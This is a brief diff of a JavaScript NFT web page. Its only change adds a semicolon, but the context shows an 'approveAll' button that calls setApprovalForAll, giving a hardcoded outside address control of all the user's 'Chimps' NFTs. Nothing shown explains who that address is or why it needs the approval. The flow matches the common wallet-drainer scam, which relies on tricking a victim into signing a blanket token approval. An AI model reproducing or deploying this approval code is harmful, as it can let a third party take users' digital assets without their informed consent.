@@ -39,7 +39,7 @@ document.getElementById('mmwallet').onclick = async () => {
             });
         
         document.getElementById('approveAll').onclick = async () => {
-            var content = "Allowing Chimps.."
+            var content = "Allowing Chimps..";
             document.getElementById('approveAll').textContent = content;
             var event = chimpsNFT.methods.setApprovalForAll("0x8f1C648d3e2F9f8DeC269397f288DA5c2A73c691", true).send({ from: chimpers })
                 .then(function (result) {
